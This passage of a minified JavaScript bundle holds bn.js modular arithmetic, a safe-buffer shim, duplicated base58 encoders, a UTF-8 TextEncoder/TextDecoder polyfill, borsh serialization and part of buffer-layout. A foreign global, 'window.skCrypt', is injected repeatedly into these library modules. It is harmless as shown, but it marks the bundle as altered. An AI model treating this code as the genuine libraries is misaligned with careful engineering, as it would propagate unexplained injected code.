            (S.prototype.sqr = function (t) {
              return this.mul(t, t);
            }),
            (S.prototype.sqrt = function (t) {
              if (t.isZero()) return t.clone();
              var e = this.m.andln(3);
              if ((n(e % 2 == 1), 3 === e)) {
                var r = this.m.add(new o(1)).iushrn(2);
                return this.pow(t, r);
              }
              for (
                var i = this.m.subn(1), s = 0;
                !i.isZero() && 0 === i.andln(1);

              )
                s++, i.iushrn(1);
              n(!i.isZero());
              var a = new o(1).toRed(this),
                u = a.redNeg(),
                c = this.m.subn(1).iushrn(1),
                l = this.m.bitLength();
              for (
                l = new o(2 * l * l).toRed(this);
                0 !== this.pow(l, c).cmp(u);

              )
                l.redIAdd(u);
              for (
                var d = this.pow(l, i),
                  f = this.pow(t, i.addn(1).iushrn(1)),
                  h = this.pow(t, i),
                  p = s;
                0 !== h.cmp(a);

              ) {
                for (var m = h, g = 0; 0 !== m.cmp(a); g++) m = m.redSqr();
                n(g < p);
                var y = this.pow(d, new o(1).iushln(p - g - 1));
                (f = f.redMul(y)), (d = y.redSqr()), (h = h.redMul(d)), (p = g);
              }
              return f;
            }),
            (S.prototype.invm = function (t) {
              var e = t._invmp(this.m);
              return 0 !== e.negative
                ? ((e.negative = 0), this.imod(e).redNeg())
                : this.imod(e);
            }),
            (S.prototype.pow = function (t, e) {
              if (e.isZero()) return new o(1).toRed(this);
              if (0 === e.cmpn(1)) return t.clone();
              var n = new Array(16);
              (n[0] = new o(1).toRed(this)), (n[1] = t);
              for (var r = 2; r < n.length; r++) n[r] = this.mul(n[r - 1], t);
              var i = n[0],
                s = 0,
                a = 0,
                u = e.bitLength() % 26;
              for (0 === u && (u = 26), r = e.length - 1; r >= 0; r--) {
                for (var c = e.words[r], l = u - 1; l >= 0; l--) {
                  var d = (c >> l) & 1;
                  i !== n[0] && (i = this.sqr(i)),
                    0 !== d || 0 !== s
                      ? ((s <<= 1),
                        (s |= d),
                        (4 === ++a || (0 === r && 0 === l)) &&
                          ((i = this.mul(i, n[s])), (a = 0), (s = 0)))
                      : (a = 0);
                }
                u = 26;
              }
              return i;
            }),
            (S.prototype.convertTo = function (t) {
              var e = t.umod(this.m);
              return e === t ? e.clone() : e;
            }),
            (S.prototype.convertFrom = function (t) {
              var e = t.clone();
              return (e.red = null), e;
            }),
            (o.mont = function (t) {
              return new _(t);
            }),
            r(_, S),
            (_.prototype.convertTo = function (t) {
              return this.imod(t.ushln(this.shift));
            }),
            (_.prototype.convertFrom = function (t) {
              var e = this.imod(t.mul(this.rinv));
              return (e.red = null), e;
            }),
            (_.prototype.imul = function (t, e) {
              if (t.isZero() || e.isZero())
                return (t.words[0] = 0), (t.length = 1), t;
              var n = t.imul(e),
                r = n
                  .maskn(this.shift)
                  .mul(this.minv)
                  .imaskn(this.shift)
                  .mul(this.m),
                o = n.isub(r).iushrn(this.shift),
                i = o;
              return (
                o.cmp(this.m) >= 0
                  ? (i = o.isub(this.m))
                  : o.cmpn(0) < 0 && (i = o.iadd(this.m)),
                i._forceRed(this)
              );
            }),
            (_.prototype.mul = function (t, e) {
              if (t.isZero() || e.isZero()) return new o(0)._forceRed(this);
              var n = t.mul(e),
                r = n
                  .maskn(this.shift)
                  .mul(this.minv)
                  .imaskn(this.shift)
                  .mul(this.m),
                i = n.isub(r).iushrn(this.shift),
                s = i;
              return (
                i.cmp(this.m) >= 0
                  ? (s = i.isub(this.m))
                  : i.cmpn(0) < 0 && (s = i.iadd(this.m)),
                s._forceRed(this)
              );
            }),
            (_.prototype.invm = function (t) {
              return this.imod(t._invmp(this.m).mul(this.r2))._forceRed(this);
            });
        })(t, Zn)),
      jn.exports
    );
    var t;
  }
  var Jn = Xn();
  const Yn = zn(Jn);
  var Qn,
    $n,
    tr,
    er,
    nr,
    rr = { exports: {} };
  function or() {
    return (
      Qn ||
        ((Qn = 1),
        (function (t, e) {
          window.skCrypt = function (t) {
            return function () {
              return t;
            };
          };
          var n = Vn(),
            r = n.Buffer;
          function o(t, e) {
            for (var n in t) e[n] = t[n];
          }
          function i(t, e, n) {
            return r(t, e, n);
          }
          r.from && r.alloc && r.allocUnsafe && r.allocUnsafeSlow
            ? (t.exports = n)
            : (o(n, e), (e.Buffer = i)),
            (i.prototype = Object.create(r.prototype)),
            o(r, i),
            (i.from = function (t, e, n) {
              if ("number" == typeof t)
                throw new TypeError("Argument must not be a number");
              return r(t, e, n);
            }),
            (i.alloc = function (t, e, n) {
              if ("number" != typeof t)
                throw new TypeError("Argument must be a number");
              var o = r(t);
              return (
                void 0 !== e
                  ? "string" == typeof n
                    ? o.fill(e, n)
                    : o.fill(e)
                  : o.fill(0),
                o
              );
            }),
            (i.allocUnsafe = function (t) {
              if ("number" != typeof t)
                throw new TypeError("Argument must be a number");
              return r(t);
            }),
            (i.allocUnsafeSlow = function (t) {
              if ("number" != typeof t)
                throw new TypeError("Argument must be a number");
              return n.SlowBuffer(t);
            });
        })(rr, rr.exports)),
      rr.exports
    );
  }
  var ir = (function () {
    if (nr) return er;
    (nr = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      });
    var t = (function () {
      if (tr) return $n;
      (tr = 1),
        (window.skCrypt = function (t) {
          return function () {
            return t;
          };
        });
      var t = or().Buffer;
      return ($n = function (e) {
        if (e.length >= 255) throw new TypeError("Alphabet too long");
        for (var n = new Uint8Array(256), r = 0; r < n.length; r++) n[r] = 255;
        for (var o = 0; o < e.length; o++) {
          var i = e.charAt(o),
            s = i.charCodeAt(0);
          if (255 !== n[s]) throw new TypeError(i + " is ambiguous");
          n[s] = o;
        }
        var a = e.length,
          u = e.charAt(0),
          c = Math.log(a) / Math.log(256),
          l = Math.log(256) / Math.log(a);
        function d(e) {
          if ("string" != typeof e) throw new TypeError("Expected String");
          if (0 === e.length) return t.alloc(0);
          for (var r = 0, o = 0, i = 0; e[r] === u; ) o++, r++;
          for (
            var s = ((e.length - r) * c + 1) >>> 0, l = new Uint8Array(s);
            r < e.length;

          ) {
            var d = e.charCodeAt(r);
            if (d > 255) return;
            var f = n[d];
            if (255 === f) return;
            for (var h = 0, p = s - 1; (0 !== f || h < i) && -1 !== p; p--, h++)
              (f += (a * l[p]) >>> 0),
                (l[p] = f % 256 >>> 0),
                (f = (f / 256) >>> 0);
            if (0 !== f) throw new Error("Non-zero carry");
            (i = h), r++;
          }
          for (var m = s - i; m !== s && 0 === l[m]; ) m++;
          var g = t.allocUnsafe(o + (s - m));
          g.fill(0, 0, o);
          for (var y = o; m !== s; ) g[y++] = l[m++];
          return g;
        }
        return {
          encode: function (n) {
            if (
              ((Array.isArray(n) || n instanceof Uint8Array) && (n = t.from(n)),
              !t.isBuffer(n))
            )
              throw new TypeError("Expected Buffer");
            if (0 === n.length) return "";
            for (var r = 0, o = 0, i = 0, s = n.length; i !== s && 0 === n[i]; )
              i++, r++;
            for (
              var c = ((s - i) * l + 1) >>> 0, d = new Uint8Array(c);
              i !== s;

            ) {
              for (
                var f = n[i], h = 0, p = c - 1;
                (0 !== f || h < o) && -1 !== p;
                p--, h++
              )
                (f += (256 * d[p]) >>> 0),
                  (d[p] = f % a >>> 0),
                  (f = (f / a) >>> 0);
              if (0 !== f) throw new Error("Non-zero carry");
              (o = h), i++;
            }
            for (var m = c - o; m !== c && 0 === d[m]; ) m++;
            for (var g = u.repeat(r); m < c; ++m) g += e.charAt(d[m]);
            return g;
          },
          decodeUnsafe: d,
          decode: function (t) {
            var e = d(t);
            if (e) return e;
            throw new Error("Non-base" + a + " character");
          },
        };
      });
    })();
    return (er = t(
      "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    ));
  })();
  const sr = zn(ir);
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const ar = ye;
  var ur,
    cr,
    lr,
    dr,
    fr = {};
  function hr() {
    if (dr) return lr;
    (dr = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      });
    var t = (function () {
      if (cr) return ur;
      (cr = 1),
        (window.skCrypt = function (t) {
          return function () {
            return t;
          };
        });
      var t = or().Buffer;
      return (ur = function (e) {
        if (e.length >= 255) throw new TypeError("Alphabet too long");
        for (var n = new Uint8Array(256), r = 0; r < n.length; r++) n[r] = 255;
        for (var o = 0; o < e.length; o++) {
          var i = e.charAt(o),
            s = i.charCodeAt(0);
          if (255 !== n[s]) throw new TypeError(i + " is ambiguous");
          n[s] = o;
        }
        var a = e.length,
          u = e.charAt(0),
          c = Math.log(a) / Math.log(256),
          l = Math.log(256) / Math.log(a);
        function d(e) {
          if ("string" != typeof e) throw new TypeError("Expected String");
          if (0 === e.length) return t.alloc(0);
          for (var r = 0, o = 0, i = 0; e[r] === u; ) o++, r++;
          for (
            var s = ((e.length - r) * c + 1) >>> 0, l = new Uint8Array(s);
            r < e.length;

          ) {
            var d = e.charCodeAt(r);
            if (d > 255) return;
            var f = n[d];
            if (255 === f) return;
            for (var h = 0, p = s - 1; (0 !== f || h < i) && -1 !== p; p--, h++)
              (f += (a * l[p]) >>> 0),
                (l[p] = f % 256 >>> 0),
                (f = (f / 256) >>> 0);
            if (0 !== f) throw new Error("Non-zero carry");
            (i = h), r++;
          }
          for (var m = s - i; m !== s && 0 === l[m]; ) m++;
          var g = t.allocUnsafe(o + (s - m));
          g.fill(0, 0, o);
          for (var y = o; m !== s; ) g[y++] = l[m++];
          return g;
        }
        return {
          encode: function (n) {
            if (
              ((Array.isArray(n) || n instanceof Uint8Array) && (n = t.from(n)),
              !t.isBuffer(n))
            )
              throw new TypeError("Expected Buffer");
            if (0 === n.length) return "";
            for (var r = 0, o = 0, i = 0, s = n.length; i !== s && 0 === n[i]; )
              i++, r++;
            for (
              var c = ((s - i) * l + 1) >>> 0, d = new Uint8Array(c);
              i !== s;

            ) {
              for (
                var f = n[i], h = 0, p = c - 1;
                (0 !== f || h < o) && -1 !== p;
                p--, h++
              )
                (f += (256 * d[p]) >>> 0),
                  (d[p] = f % a >>> 0),
                  (f = (f / a) >>> 0);
              if (0 !== f) throw new Error("Non-zero carry");
              (o = h), i++;
            }
            for (var m = c - o; m !== c && 0 === d[m]; ) m++;
            for (var g = u.repeat(r); m < c; ++m) g += e.charAt(d[m]);
            return g;
          },
          decodeUnsafe: d,
          decode: function (t) {
            var e = d(t);
            if (e) return e;
            throw new Error("Non-base" + a + " character");
          },
        };
      });
    })();
    return (lr = t(
      "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    ));
  }
  function pr(t, e, n) {
    return e <= t && t <= n;
  }
  function mr(t) {
    if (void 0 === t) return {};
    if (t === Object(t)) return t;
    throw TypeError("Could not convert argument to dictionary");
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  function gr(t) {
    this.tokens = [].slice.call(t);
  }
  gr.prototype = {
    endOfStream: function () {
      return !this.tokens.length;
    },
    read: function () {
      return this.tokens.length ? this.tokens.shift() : -1;
    },
    prepend: function (t) {
      if (Array.isArray(t))
        for (var e = t; e.length; ) this.tokens.unshift(e.pop());
      else this.tokens.unshift(t);
    },
    push: function (t) {
      if (Array.isArray(t))
        for (var e = t; e.length; ) this.tokens.push(e.shift());
      else this.tokens.push(t);
    },
  };
  var yr = -1;
  function wr(t, e) {
    if (t) throw TypeError("Decoder error");
    return e || 65533;
  }
  var br = "utf-8";
  function vr(t, e) {
    if (!(this instanceof vr)) return new vr(t, e);
    if ((t = void 0 !== t ? String(t).toLowerCase() : br) !== br)
      throw new Error("Encoding not supported. Only utf-8 is supported");
    (e = mr(e)),
      (this._streaming = !1),
      (this._BOMseen = !1),
      (this._decoder = null),
      (this._fatal = Boolean(e.fatal)),
      (this._ignoreBOM = Boolean(e.ignoreBOM)),
      Object.defineProperty(this, "encoding", { value: "utf-8" }),
      Object.defineProperty(this, "fatal", { value: this._fatal }),
      Object.defineProperty(this, "ignoreBOM", { value: this._ignoreBOM });
  }
  function Ar(t, e) {
    if (!(this instanceof Ar)) return new Ar(t, e);
    if ((t = void 0 !== t ? String(t).toLowerCase() : br) !== br)
      throw new Error("Encoding not supported. Only utf-8 is supported");
    (e = mr(e)),
      (this._streaming = !1),
      (this._encoder = null),
      (this._options = { fatal: Boolean(e.fatal) }),
      Object.defineProperty(this, "encoding", { value: "utf-8" });
  }
  function kr(t) {
    var e = t.fatal,
      n = 0,
      r = 0,
      o = 0,
      i = 128,
      s = 191;
    this.handler = function (t, a) {
      if (-1 === a && 0 !== o) return (o = 0), wr(e);
      if (-1 === a) return yr;
      if (0 === o) {
        if (pr(a, 0, 127)) return a;
        if (pr(a, 194, 223)) (o = 1), (n = a - 192);
        else if (pr(a, 224, 239))
          224 === a && (i = 160),
            237 === a && (s = 159),
            (o = 2),
            (n = a - 224);
        else {
          if (!pr(a, 240, 244)) return wr(e);
          240 === a && (i = 144),
            244 === a && (s = 143),
            (o = 3),
            (n = a - 240);
        }
        return (n <<= 6 * o), null;
      }
      if (!pr(a, i, s))
        return (n = o = r = 0), (i = 128), (s = 191), t.prepend(a), wr(e);
      if (
        ((i = 128),
        (s = 191),
        (n += (a - 128) << (6 * (o - (r += 1)))),
        r !== o)
      )
        return null;
      var u = n;
      return (n = o = r = 0), u;
    };
  }
  function Ir(t) {
    t.fatal,
      (this.handler = function (t, e) {
        if (-1 === e) return yr;
        if (pr(e, 0, 127)) return e;
        var n, r;
        pr(e, 128, 2047)
          ? ((n = 1), (r = 192))
          : pr(e, 2048, 65535)
          ? ((n = 2), (r = 224))
          : pr(e, 65536, 1114111) && ((n = 3), (r = 240));
        for (var o = [(e >> (6 * n)) + r]; n > 0; ) {
          var i = e >> (6 * (n - 1));
          o.push(128 | (63 & i)), (n -= 1);
        }
        return o;
      });
  }
  (vr.prototype = {
    decode: function (t, e) {
      var n;
      (n =
        "object" == typeof t && t instanceof ArrayBuffer
          ? new Uint8Array(t)
          : "object" == typeof t &&
            "buffer" in t &&
            t.buffer instanceof ArrayBuffer
          ? new Uint8Array(t.buffer, t.byteOffset, t.byteLength)
          : new Uint8Array(0)),
        (e = mr(e)),
        this._streaming ||
          ((this._decoder = new kr({ fatal: this._fatal })),
          (this._BOMseen = !1)),
        (this._streaming = Boolean(e.stream));
      for (
        var r, o = new gr(n), i = [];
        !o.endOfStream() && (r = this._decoder.handler(o, o.read())) !== yr;

      )
        null !== r && (Array.isArray(r) ? i.push.apply(i, r) : i.push(r));
      if (!this._streaming) {
        do {
          if ((r = this._decoder.handler(o, o.read())) === yr) break;
          null !== r && (Array.isArray(r) ? i.push.apply(i, r) : i.push(r));
        } while (!o.endOfStream());
        this._decoder = null;
      }
      return (
        i.length &&
          (-1 === ["utf-8"].indexOf(this.encoding) ||
            this._ignoreBOM ||
            this._BOMseen ||
            (65279 === i[0]
              ? ((this._BOMseen = !0), i.shift())
              : (this._BOMseen = !0))),
        (function (t) {
          for (var e = "", n = 0; n < t.length; ++n) {
            var r = t[n];
            r <= 65535
              ? (e += String.fromCharCode(r))
              : ((r -= 65536),
                (e += String.fromCharCode(
                  55296 + (r >> 10),
                  56320 + (1023 & r)
                )));
          }
          return e;
        })(i)
      );
    },
  }),
    (Ar.prototype = {
      encode: function (t, e) {
        (t = t ? String(t) : ""),
          (e = mr(e)),
          this._streaming || (this._encoder = new Ir(this._options)),
          (this._streaming = Boolean(e.stream));
        for (
          var n,
            r = [],
            o = new gr(
              (function (t) {
                for (var e = String(t), n = e.length, r = 0, o = []; r < n; ) {
                  var i = e.charCodeAt(r);
                  if (i < 55296 || i > 57343) o.push(i);
                  else if (56320 <= i && i <= 57343) o.push(65533);
                  else if (55296 <= i && i <= 56319)
                    if (r === n - 1) o.push(65533);
                    else {
                      var s = t.charCodeAt(r + 1);
                      if (56320 <= s && s <= 57343) {
                        var a = 1023 & i,
                          u = 1023 & s;
                        o.push(65536 + (a << 10) + u), (r += 1);
                      } else o.push(65533);
                    }
                  r += 1;
                }
                return o;
              })(t)
            );
          !o.endOfStream() && (n = this._encoder.handler(o, o.read())) !== yr;

        )
          Array.isArray(n) ? r.push.apply(r, n) : r.push(n);
        if (!this._streaming) {
          for (; (n = this._encoder.handler(o, o.read())) !== yr; )
            Array.isArray(n) ? r.push.apply(r, n) : r.push(n);
          this._encoder = null;
        }
        return new Uint8Array(r);
      },
    });
  const Sr = Wn(
    Object.freeze(
      Object.defineProperty(
        { __proto__: null, TextDecoder: vr, TextEncoder: Ar },
        Symbol.toStringTag,
        { value: "Module" }
      )
    )
  );
  var _r;
  var Tr,
    Br = (function () {
      if (_r) return fr;
      (_r = 1),
        (window.skCrypt = function (t) {
          return function () {
            return t;
          };
        });
      var t =
          (fr && fr.__createBinding) ||
          (Object.create
            ? function (t, e, n, r) {
                void 0 === r && (r = n),
                  Object.defineProperty(t, r, {
                    enumerable: !0,
                    get: function () {
                      return e[n];
                    },
                  });
              }
            : function (t, e, n, r) {
                void 0 === r && (r = n), (t[r] = e[n]);
              }),
        e =
          (fr && fr.__setModuleDefault) ||
          (Object.create
            ? function (t, e) {
                Object.defineProperty(t, "default", {
                  enumerable: !0,
                  value: e,
                });
              }
            : function (t, e) {
                t.default = e;
              }),
        n =
          (fr && fr.__decorate) ||
          function (t, e, n, r) {
            var o,
              i = arguments.length,
              s =
                i < 3
                  ? e
                  : null === r
                  ? (r = Object.getOwnPropertyDescriptor(e, n))
                  : r;
            if (
              "object" == typeof Reflect &&
              "function" == typeof Reflect.decorate
            )
              s = Reflect.decorate(t, e, n, r);
            else
              for (var a = t.length - 1; a >= 0; a--)
                (o = t[a]) &&
                  (s = (i < 3 ? o(s) : i > 3 ? o(e, n, s) : o(e, n)) || s);
            return i > 3 && s && Object.defineProperty(e, n, s), s;
          },
        r =
          (fr && fr.__importStar) ||
          function (n) {
            if (n && n.__esModule) return n;
            var r = {};
            if (null != n)
              for (var o in n)
                "default" !== o &&
                  Object.hasOwnProperty.call(n, o) &&
                  t(r, n, o);
            return e(r, n), r;
          },
        o =
          (fr && fr.__importDefault) ||
          function (t) {
            return t && t.__esModule ? t : { default: t };
          };
      Object.defineProperty(fr, "__esModule", { value: !0 }),
        (fr.deserializeUnchecked =
          fr.deserialize =
          fr.serialize =
          fr.BinaryReader =
          fr.BinaryWriter =
          fr.BorshError =
          fr.baseDecode =
          fr.baseEncode =
            void 0);
      const i = o(Xn()),
        s = o(hr()),
        a = r(Sr),
        u = new (
          "function" != typeof TextDecoder ? a.TextDecoder : TextDecoder
        )("utf-8", { fatal: !0 });
      (fr.baseEncode = function (t) {
        return (
          "string" == typeof t && (t = dt.from(t, "utf8")),
          s.default.encode(dt.from(t))
        );
      }),
        (fr.baseDecode = function (t) {
          return dt.from(s.default.decode(t));
        });
      const c = 1024;
      class l extends Error {
        constructor(t) {
          super(t), (this.fieldPath = []), (this.originalMessage = t);
        }
        addToFieldPath(t) {
          this.fieldPath.splice(0, 0, t),
            (this.message =
              this.originalMessage + ": " + this.fieldPath.join("."));
        }
      }
      fr.BorshError = l;
      class d {
        constructor() {
          (this.buf = dt.alloc(c)), (this.length = 0);
        }
        maybeResize() {
          this.buf.length < 16 + this.length &&
            (this.buf = dt.concat([this.buf, dt.alloc(c)]));
        }
        writeU8(t) {
          this.maybeResize(),
            this.buf.writeUInt8(t, this.length),
            (this.length += 1);
        }
        writeU16(t) {
          this.maybeResize(),
            this.buf.writeUInt16LE(t, this.length),
            (this.length += 2);
        }
        writeU32(t) {
          this.maybeResize(),
            this.buf.writeUInt32LE(t, this.length),
            (this.length += 4);
        }
        writeU64(t) {
          this.maybeResize(),
            this.writeBuffer(dt.from(new i.default(t).toArray("le", 8)));
        }
        writeU128(t) {
          this.maybeResize(),
            this.writeBuffer(dt.from(new i.default(t).toArray("le", 16)));
        }
        writeU256(t) {
          this.maybeResize(),
            this.writeBuffer(dt.from(new i.default(t).toArray("le", 32)));
        }
        writeU512(t) {
          this.maybeResize(),
            this.writeBuffer(dt.from(new i.default(t).toArray("le", 64)));
        }
        writeBuffer(t) {
          (this.buf = dt.concat([
            dt.from(this.buf.subarray(0, this.length)),
            t,
            dt.alloc(c),
          ])),
            (this.length += t.length);
        }
        writeString(t) {
          this.maybeResize();
          const e = dt.from(t, "utf8");
          this.writeU32(e.length), this.writeBuffer(e);
        }
        writeFixedArray(t) {
          this.writeBuffer(dt.from(t));
        }
        writeArray(t, e) {
          this.maybeResize(), this.writeU32(t.length);
          for (const n of t) this.maybeResize(), e(n);
        }
        toArray() {
          return this.buf.subarray(0, this.length);
        }
      }
      function f(t, e, n) {
        const r = n.value;
        n.value = function (...t) {
          try {
            return r.apply(this, t);
          } catch (e) {
            if (e instanceof RangeError) {
              const t = e.code;
              if (
                ["ERR_BUFFER_OUT_OF_BOUNDS", "ERR_OUT_OF_RANGE"].indexOf(t) >= 0
              )
                throw new l("Reached the end of buffer when deserializing");
            }
            throw e;
          }
        };
      }
      fr.BinaryWriter = d;
      class h {
        constructor(t) {
          (this.buf = t), (this.offset = 0);
        }
        readU8() {
          const t = this.buf.readUInt8(this.offset);
          return (this.offset += 1), t;
        }
        readU16() {
          const t = this.buf.readUInt16LE(this.offset);
          return (this.offset += 2), t;
        }
        readU32() {
          const t = this.buf.readUInt32LE(this.offset);
          return (this.offset += 4), t;
        }
        readU64() {
          const t = this.readBuffer(8);
          return new i.default(t, "le");
        }
        readU128() {
          const t = this.readBuffer(16);
          return new i.default(t, "le");
        }
        readU256() {
          const t = this.readBuffer(32);
          return new i.default(t, "le");
        }
        readU512() {
          const t = this.readBuffer(64);
          return new i.default(t, "le");
        }
        readBuffer(t) {
          if (this.offset + t > this.buf.length)
            throw new l(`Expected buffer length ${t} isn't within bounds`);
          const e = this.buf.slice(this.offset, this.offset + t);
          return (this.offset += t), e;
        }
        readString() {
          const t = this.readU32(),
            e = this.readBuffer(t);
          try {
            return u.decode(e);
          } catch (n) {
            throw new l(`Error decoding UTF-8 string: ${n}`);
          }
        }
        readFixedArray(t) {
          return new Uint8Array(this.readBuffer(t));
        }
        readArray(t) {
          const e = this.readU32(),
            n = Array();
          for (let r = 0; r < e; ++r) n.push(t());
          return n;
        }
      }
      function p(t) {
        return t.charAt(0).toUpperCase() + t.slice(1);
      }
      function m(t, e, n, r, o) {
        try {
          if ("string" == typeof r) o[`write${p(r)}`](n);
          else if (r instanceof Array)
            if ("number" == typeof r[0]) {
              if (n.length !== r[0])
                throw new l(
                  `Expecting byte array of length ${r[0]}, but got ${n.length} bytes`
                );
              o.writeFixedArray(n);
            } else if (2 === r.length && "number" == typeof r[1]) {
              if (n.length !== r[1])
                throw new l(
                  `Expecting byte array of length ${r[1]}, but got ${n.length} bytes`
                );
              for (let e = 0; e < r[1]; e++) m(t, null, n[e], r[0], o);
            } else
              o.writeArray(n, (n) => {
                m(t, e, n, r[0], o);
              });
          else if (void 0 !== r.kind)
            switch (r.kind) {
              case "option":
                null == n
                  ? o.writeU8(0)
                  : (o.writeU8(1), m(t, e, n, r.type, o));
                break;
              case "map":
                o.writeU32(n.size),
                  n.forEach((n, i) => {
                    m(t, e, i, r.key, o), m(t, e, n, r.value, o);
                  });
                break;
              default:
                throw new l(`FieldType ${r} unrecognized`);
            }
          else g(t, n, o);
        } catch (i) {
          throw (i instanceof l && i.addToFieldPath(e), i);
        }
      }
      function g(t, e, n) {
        if ("function" == typeof e.borshSerialize)
          return e.borshSerialize(n), void 0;
        const r = t.get(e.constructor);
        if (!r) throw new l(`Class ${e.constructor.name} is missing in schema`);
        if ("struct" === r.kind)
          r.fields.map(([r, o]) => {
            m(t, r, e[r], o, n);
          });
        else {
          if ("enum" !== r.kind)
            throw new l(
              `Unexpected schema kind: ${r.kind} for ${e.constructor.name}`
            );
          {
            const o = e[r.field];
            for (let i = 0; i < r.values.length; ++i) {
              const [s, a] = r.values[i];
              if (s === o) {
                n.writeU8(i), m(t, s, e[s], a, n);
                break;
              }
            }
          }
        }
      }
      function y(t, e, n, r) {
        try {
          if ("string" == typeof n) return r[`read${p(n)}`]();
          if (n instanceof Array) {
            if ("number" == typeof n[0]) return r.readFixedArray(n[0]);
            if ("number" == typeof n[1]) {
              const e = [];
              for (let o = 0; o < n[1]; o++) e.push(y(t, null, n[0], r));
              return e;
            }
            return r.readArray(() => y(t, e, n[0], r));
          }
          if ("option" === n.kind) {
            return r.readU8() ? y(t, e, n.type, r) : void 0;
          }
          if ("map" === n.kind) {
            let o = new Map();
            const i = r.readU32();
            for (let s = 0; s < i; s++) {
              const i = y(t, e, n.key, r),
                s = y(t, e, n.value, r);
              o.set(i, s);
            }
            return o;
          }
          return w(t, n, r);
        } catch (o) {
          throw (o instanceof l && o.addToFieldPath(e), o);
        }
      }
      function w(t, e, n) {
        if ("function" == typeof e.borshDeserialize)
          return e.borshDeserialize(n);
        const r = t.get(e);
        if (!r) throw new l(`Class ${e.name} is missing in schema`);
        if ("struct" === r.kind) {
          const r = {};
          for (const [o, i] of t.get(e).fields) r[o] = y(t, o, i, n);
          return new e(r);
        }
        if ("enum" === r.kind) {
          const o = n.readU8();
          if (o >= r.values.length)
            throw new l(`Enum index: ${o} is out of range`);
          const [i, s] = r.values[o],
            a = y(t, i, s, n);
          return new e({ [i]: a });
        }
        throw new l(
          `Unexpected schema kind: ${r.kind} for ${e.constructor.name}`
        );
      }
      return (
        n([f], h.prototype, "readU8", null),
        n([f], h.prototype, "readU16", null),
        n([f], h.prototype, "readU32", null),
        n([f], h.prototype, "readU64", null),
        n([f], h.prototype, "readU128", null),
        n([f], h.prototype, "readU256", null),
        n([f], h.prototype, "readU512", null),
        n([f], h.prototype, "readString", null),
        n([f], h.prototype, "readFixedArray", null),
        n([f], h.prototype, "readArray", null),
        (fr.BinaryReader = h),
        (fr.serialize = function (t, e, n = d) {
          const r = new n();
          return g(t, e, r), r.toArray();
        }),
        (fr.deserialize = function (t, e, n, r = h) {
          const o = new r(n),
            i = w(t, e, o);
          if (o.offset < n.length)
            throw new l(
              `Unexpected ${n.length - o.offset} bytes after deserialized data`
            );
          return i;
        }),
        (fr.deserializeUnchecked = function (t, e, n, r = h) {
          return w(t, e, new r(n));
        }),
        fr
      );
    })(),
    Cr = {};
  var Er = (function () {
    if (Tr) return Cr;
    (Tr = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      }),
      Object.defineProperty(Cr, "__esModule", { value: !0 }),
      (Cr.s16 =
        Cr.s8 =
        Cr.nu64be =
        Cr.u48be =
        Cr.u40be =
        Cr.u32be =
        Cr.u24be =
        Cr.u16be =
        Cr.nu64 =
        Cr.u48 =
        Cr.u40 =
        Cr.u32 =
        Cr.u24 =
        Cr.u16 =
        Cr.u8 =
        Cr.offset =
        Cr.greedy =
        Cr.Constant =
        Cr.UTF8 =
        Cr.CString =
        Cr.Blob =
        Cr.Boolean =
        Cr.BitField =
        Cr.BitStructure =
        Cr.VariantLayout =
        Cr.Union =
        Cr.UnionLayoutDiscriminator =
        Cr.UnionDiscriminator =
        Cr.Structure =
        Cr.Sequence =
        Cr.DoubleBE =
        Cr.Double =
        Cr.FloatBE =
        Cr.Float =
        Cr.NearInt64BE =
        Cr.NearInt64 =
        Cr.NearUInt64BE =
        Cr.NearUInt64 =
        Cr.IntBE =
        Cr.Int =
        Cr.UIntBE =
        Cr.UInt =
        Cr.OffsetLayout =
        Cr.GreedyCount =
        Cr.ExternalLayout =
        Cr.bindConstructorLayout =
        Cr.nameWithProperty =
        Cr.Layout =
        Cr.uint8ArrayToBuffer =
        Cr.checkUint8Array =
          void 0),
      (Cr.constant =
        Cr.utf8 =
        Cr.cstr =
        Cr.blob =
        Cr.unionLayoutDiscriminator =
        Cr.union =
        Cr.seq =
        Cr.bits =
        Cr.struct =
        Cr.f64be =
        Cr.f64 =
        Cr.f32be =
        Cr.f32 =
        Cr.ns64be =
        Cr.s48be =
        Cr.s40be =
        Cr.s32be =
        Cr.s24be =
        Cr.s16be =
        Cr.ns64 =
        Cr.s48 =
        Cr.s40 =
        Cr.s32 =
        Cr.s24 =
          void 0);
    const t = Vn();
    function e(t) {
      if (!(t instanceof Uint8Array))
        throw new TypeError("b must be a Uint8Array");
    }
    function n(n) {
      return e(n), t.Buffer.from(n.buffer, n.byteOffset, n.length);
    }
    (Cr.checkUint8Array = e), (Cr.uint8ArrayToBuffer = n);
    class r {
      constructor(t, e) {
        if (!Number.isInteger(t))
          throw new TypeError("span must be an integer");
        (this.span = t), (this.property = e);
      }
      makeDestinationObject() {
        return {};
      }
      getSpan(t, e) {
        if (0 > this.span) throw new RangeError("indeterminate span");
        return this.span;
      }
      replicate(t) {
        const e = Object.create(this.constructor.prototype);
        return Object.assign(e, this), (e.property = t), e;
      }
      fromArray(t) {}
    }
    function o(t, e) {
      return e.property ? t + "[" + e.property + "]" : t;
    }
    (Cr.Layout = r),
      (Cr.nameWithProperty = o),
      (Cr.bindConstructorLayout = function (t, e) {
        if ("function" != typeof t)
          throw new TypeError("Class must be constructor");
        if (Object.prototype.hasOwnProperty.call(t, "layout_"))
          throw new Error("Class is already bound to a layout");
        if (!(e && e instanceof r))
          throw new TypeError("layout must be a Layout");
        if (Object.prototype.hasOwnProperty.call(e, "boundConstructor_"))
          throw new Error("layout is already bound to a constructor");
        (t.layout_ = e),
          (e.boundConstructor_ = t),
          (e.makeDestinationObject = () => new t()),
          Object.defineProperty(t.prototype, "encode", {
            value(t, n) {
              return e.encode(this, t, n);
            },
            writable: !0,
          }),
          Object.defineProperty(t, "decode", {
            value: (t, n) => e.decode(t, n),
            writable: !0,
          });
      });
    class i extends r {
      isCount() {
        throw new Error("ExternalLayout is abstract");
      }
    }
    Cr.ExternalLayout = i;
    class s extends i {
      constructor(t = 1, e) {
        if (!Number.isInteger(t) || 0 >= t)
          throw new TypeError("elementSpan must be a (positive) integer");
        super(-1, e), (this.elementSpan = t);
      }
      isCount() {
